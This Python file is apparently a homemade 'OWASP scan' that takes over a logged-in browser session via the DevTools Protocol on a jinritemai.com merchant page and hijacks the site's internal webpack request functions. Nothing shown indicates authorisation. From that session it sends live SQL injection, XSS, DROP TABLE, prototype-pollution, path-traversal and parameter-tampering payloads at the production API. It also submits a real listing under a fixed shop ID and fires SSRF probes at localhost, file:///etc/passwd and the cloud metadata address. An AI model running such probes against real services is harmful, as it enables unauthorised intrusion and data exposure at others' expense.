# -*- coding: utf-8 -*-
"""OWASP扫描: SQL注入/XSS/原型污染/参数篡改/Token模式"""
import json, time, sys, os, collections
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from urllib.request import urlopen
import websocket

targets = json.loads(urlopen('http://127.0.0.1:9222/json/list', timeout=3).read())
t = next((x for x in targets if 'jinritemai.com' in (x.get('url') or '')), targets[0])
ws = websocket.create_connection(t['webSocketDebuggerUrl'], timeout=10, suppress_origin=True)
ws.settimeout(3)
mid = [0]

def cdp(m, p=None, timeout=20):
    mid[0] += 1
    ws.send(json.dumps({'id': mid[0], 'method': m, 'params': p or {}}))
    dl = time.time() + timeout
    while time.time() < dl:
        try:
            raw = ws.recv()
            msg = json.loads(raw)
            if msg.get('id') == mid[0]:
                return msg
        except:
            continue
    return {}

cdp('Runtime.enable')
r = cdp('Runtime.evaluate', {
    'expression': '''
        (function() {
            var chunkName = Object.keys(window).find(function(k) { return k.includes('@ecom-mcenter/ffa-goods'); });
            window[chunkName].push([[Math.floor(Math.random() * 1e9)], {}, function(req) { window.__fxgWebpackRequire = req; }]);
            window.__fxgPost = window.__fxgWebpackRequire(90665).bE;
            window.__fxgGet = window.__fxgWebpackRequire(28974).J;
            return JSON.stringify({ok: true});
        })()
    ''', 'returnByValue': True, 'timeout': 10000
})

# Proxy function for safe testing
def safe_test(name, expr):
    r = cdp('Runtime.evaluate', {
        'expression': expr,
        'returnByValue': True, 'awaitPromise': True, 'timeout': 15000
    })
    val = ((r.get('result') or {}).get('result') or {}).get('value', '')
    try:
        result = json.loads(val) if isinstance(val, str) else (val or {})
    except:
        result = {'raw': str(val)[:200]}
    print(f'  {name}: {json.dumps(result, ensure_ascii=False)[:200]}')
    return result

print('='*60)
print('1. SQL/命令注入探测 (读操作, 不影响计数)')
print('='*60)

# SQL injection in search/query params
injection_tests = [
    ("searchCategoryN SQLi", '''
        (async function() {
            var result = await window.__fxgPost('/product/tproduct/searchCategoryN', {
                name: "袜子' OR '1'='1", level: 1
            }, {timeout: 10000});
            return JSON.stringify({code: result.code||result.errno, msg: (result.msg||'').substring(0, 100)});
        })()
    '''),
    ("searchCategoryN sleep", '''
        (async function() {
            var result = await window.__fxgPost('/product/tproduct/searchCategoryN', {
                name: "袜子' AND SLEEP(5)--", level: 1
            }, {timeout: 15000});
            return JSON.stringify({code: result.code||result.errno, msg: (result.msg||'').substring(0, 100)});
        })()
    '''),
    ("getBadWordHint XSS", '''
        (async function() {
            var result = await window.__fxgGet('/product/tproduct/getBadWordHint?text=<script>alert(1)</script>', {timeout: 10000});
            return JSON.stringify({code: result.code||result.errno, msg: (result.msg||'').substring(0, 100), data: result.data ? JSON.stringify(result.data).substring(0, 100) : null});
        })()
    '''),
    ("predictCategoryN injection", '''
        (async function() {
            var result = await window.__fxgPost('/product/tproduct/predictCategoryN', {
                title: "test'; DROP TABLE products;--"
            }, {timeout: 10000});
            return JSON.stringify({code: result.code||result.errno, msg: (result.msg||'').substring(0, 100)});
        })()
    '''),
]

for name, expr in injection_tests:
    safe_test(name, expr)

print()
print('='*60)
print('2. 原型污染 (Prototype Pollution)')
print('='*60)

r = cdp('Runtime.evaluate', {
    'expression': '''
        (async function() {
            var results = [];

            // Test 1: __proto__ in body
            var body1 = JSON.parse('{"__proto__":{"polluted":true},"schema":{"model":{"title":{"value":"原型污染测试中筒袜验证"}}}}');
            try {
                var r = await window.__fxgPost('/product/tproduct/addWithSchema?check_status=0', body1, {timeout: 10000});
                results.push({test: '__proto__', code: r.code||r.errno, msg: (r.msg||'').substring(0, 80)});
            } catch(e) { results.push({test: '__proto__', error: e.message}); }

            // Test 2: constructor.prototype pollution
            var body2 = JSON.parse('{"constructor":{"prototype":{"polluted":true}},"schema":{"model":{}}}');
            try {
                var r2 = await window.__fxgPost('/product/tproduct/addWithSchema?check_status=0', body2, {timeout: 10000});
                results.push({test: 'constructor.prototype', code: r2.code||r2.errno, msg: (r2.msg||'').substring(0, 80)});
            } catch(e) { results.push({test: 'constructor.prototype', error: e.message}); }

            return JSON.stringify(results);
        })()
    ''', 'returnByValue': True, 'awaitPromise': True, 'timeout': 30000
})
val = ((r.get('result') or {}).get('result') or {}).get('value', '')
print(f'  {val[:500]}')

print()
print('='*60)
print('3. API版本篡改')
print('='*60)

r = cdp('Runtime.evaluate', {
    'expression': '''
        (async function() {
            var results = [];
            var versions = ['v1', 'v2', 'v3', 'v1_v8_v9_v10_v11_v12', 'v99', '', '../../etc/passwd'];

            for (var i = 0; i < versions.length; i++) {
                var v = versions[i];
                var result = await window.__fxgGet('/product/tproduct/canCreateGood?is_create=1&version=' + v, {timeout: 10000});
                results.push({version: v, code: result.code||result.errno, canCreate: result.data ? result.data.can_create : '?'});
            }
            return JSON.stringify(results);
        })()
    ''', 'returnByValue': True, 'awaitPromise': True, 'timeout': 60000
})
val = ((r.get('result') or {}).get('result') or {}).get('value', '')
results = json.loads(val) if isinstance(val, str) else []
for r in results:
    print(f'  version={r.get("version"):30s} code={r.get("code")} canCreate={r.get("canCreate")}')

print()
print('='*60)
print('4. HTTP参数污染')
print('='*60)

r = cdp('Runtime.evaluate', {
    'expression': '''
        (async function() {
            // Test: multiple check_status params
            var result = await window.__fxgGet('/product/tproduct/canCreateGood?is_create=1&is_create=0&check_status=0&check_status=2', {timeout: 10000});
            return JSON.stringify({code: result.code||result.errno, canCreate: result.data ? result.data.can_create : '?'});
        })()
    ''', 'returnByValue': True, 'awaitPromise': True, 'timeout': 15000
})
val = ((r.get('result') or {}).get('result') or {}).get('value', '')
print(f'  Duplicate params: {val}')

print()
print('='*60)
print('5. Token模式分析 (收集多个__token样本)')
print('='*60)

# Collect tokens from multiple requests to check entropy
tokens = []
for i in range(5):
    r = cdp('Runtime.evaluate', {
        'expression': '''
            (async function() {
                // Force a new request to observe token pattern
                var result = await window.__fxgGet('/product/tproduct/canCreateGood?is_create=' + ''' + str(1+i%2) + ''', {timeout: 10000});
                return JSON.stringify({code: result.code||result.errno});
            })()
        ''', 'returnByValue': True, 'awaitPromise': True, 'timeout': 15000
    })
    # Can't get token from CDP easily, need Network monitoring
    time.sleep(0.5)

# Use a different approach: capture URL from network
cdp('Network.enable')
requests_captured = []

# Make a request and capture it
import datetime, random
now = datetime.datetime.now().strftime('%Y%m%d%H%M%S')
nt = now + ''.join(random.choices('0123456789ABCDEF', k=20))

body_mini = {
    'schema':{'model':{
        'title':{'value':'Token模式测试中筒袜'},
        'short_product_name':{'value':''},'title_prefix':{'value':''},'title_suffix':{'value':''},'title_use_brand_name':{'value':False},
        'goods_category':{'value':{'category_leaf_id':1000010267,'first_cid':1000003282,'first_cname':'A'}},
        'category_properties':{'value':{'1687':[{'value_id':'596120136','value_name':'无品牌'}],'1577':[{'value_id':'1991','value_name':'通用'}],'1865':[{'value_id':'31904','value_name':'中筒袜'}],'785':[{'value_id':'','value_name':'棉100%','measure_info':{'template_id':873,'values':[{'module_id':1854,'value':'棉'},{'module_id':1855,'value':'100','unit_id':15,'unit_name':'%'}]}}]}},
        'category_property_pic':{'value':{}},'pic':{'value':[]},'main_image_three_to_four':{'value':[]},'white_background_pic':{'value':[]},'description':{'value':''},
        'spec_detail':{'value':[{'id':'10000','cp_id':2752,'name':'颜色分类','spec_values':[{'id':'996874532588296918','name':'默认','cpv_id':0,'cpv_path':[],'img_url':None}]},{'id':'20000','cp_id':3939,'name':'码数','spec_values':[{'id':'990897920130195435','name':'均码','cpv_id':0,'cpv_path':[],'img_url':None}]}]},
        'sku_detail':{'value':[{'id':'tk-test','stock_info':{'stock_num':100},'sku_status':True,'confirm_no_barcode':False,'spec_detail_ids':['996874532588296918','990897920130195435'],'price':'9.9'}]},
        'freight_id':{'value':'300713474'},'pickup_method':{'value':'0'},'start_sale_type':{'value':'0'},'product_type':{'value':'0'},'presell_type':{'value':'0'},'delivery_delay_day':{'value':'2'},'reduce_type':{'value':'1'},'qualification':{'value':{}},'after_sale':{'value':{'quality_problem_return':{'option_id':None,'selected':True},'supply_day_return_selector':{'option_id':'7-1','selected':True}}},'ai_gen_spec':{'value':{'ai_gen_spec_type':0}},'alli_promotion_plan_switch':{'value':False},'area_stock_switcher':{'value':False},'goods_category_appeal':{'value':False},'interest_free_activity':{'value':[]},'interest_free_activity_id':{'value':{}},'interest_free_open':{'value':True},'reference_price_enable':{'value':False},'detail_prettify_uri':{'value':''},
    },'context':{'ability':[],'biz_identity':'xiaodian','business_code':'xiaodian','capability_codes':['standard_capability'],'category_id':'1000010267','fast_publish_type':'','feature':{'session_publish_id':'helper_test','session_data':'{}','not_first_render':'1','product_sale_property_control':'1','sale_property_sequence_variable':'1','min_sku_price':'990'},'identity_extension':'{}','model_type':'','n_token':nt,'operation_type':'normal','product_id':'0','shop_id':'177886360','token':nt,'version':'v1_v8_v9_v10_v11_v12'}},
    'category_id':'1000010267','context':{'ability':[],'biz_identity':'xiaodian','business_code':'xiaodian','capability_codes':['standard_capability'],'category_id':'1000010267','fast_publish_type':'','feature':{'session_publish_id':'helper_test','session_data':'{}','not_first_render':'1','product_sale_property_control':'1','sale_property_sequence_variable':'1','min_sku_price':'990'},'identity_extension':'{}','model_type':'','n_token':nt,'operation_type':'normal','product_id':'0','shop_id':'177886360','token':nt,'version':'v1_v8_v9_v10_v11_v12'},
    'pass_through_extra':{},'request_extra':{},'check_status':0,'session':{},'appid':1,
}
body_json = json.dumps(body_mini, ensure_ascii=False)
r = cdp('Runtime.evaluate', {
    'expression': f'''
        (async function() {{
            var result = await window.__fxgPost('/product/tproduct/addWithSchema?check_status=0', {body_json}, {{timeout: 30000}});
            return JSON.stringify({{code: result.code||result.errno, msg: (result.msg||'').substring(0, 80)}});
        }})()
    ''', 'returnByValue': True, 'awaitPromise': True, 'timeout': 40000
})
val = ((r.get('result') or {}).get('result') or {}).get('value', '')
print(f'  Submission result: {str(val)[:200]}')

print()
print('='*60)
print('6. 路径遍历 & SSRF 探测')
print('='*60)

r = cdp('Runtime.evaluate', {
    'expression': '''
        (async function() {
            var results = [];
            // Test SSRF via image URL
            var probes = [
                {url: 'https://127.0.0.1:443/admin', label: 'SSRF localhost'},
                {url: 'file:///etc/passwd', label: 'file://'},
                {url: 'http://169.254.169.254/latest/meta-data/', label: 'AWS metadata'},
            ];

            for (var i = 0; i < probes.length; i++) {
                try {
                    var resp = await fetch('/product/img/batchTransPics', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({urls: [probes[i].url], type: 'trans'}),
                        credentials: 'include'
                    });
                    var text = await resp.text();
                    results.push({label: probes[i].label, resp: text.substring(0, 150)});
                } catch(e) {
                    results.push({label: probes[i].label, error: e.message});
                }
            }
            return JSON.stringify(results);
        })()
    ''', 'returnByValue': True, 'awaitPromise': True, 'timeout': 30000
})
val = ((r.get('result') or {}).get('result') or {}).get('value', '')
print(f'  {val[:1000]}')

ws.close()
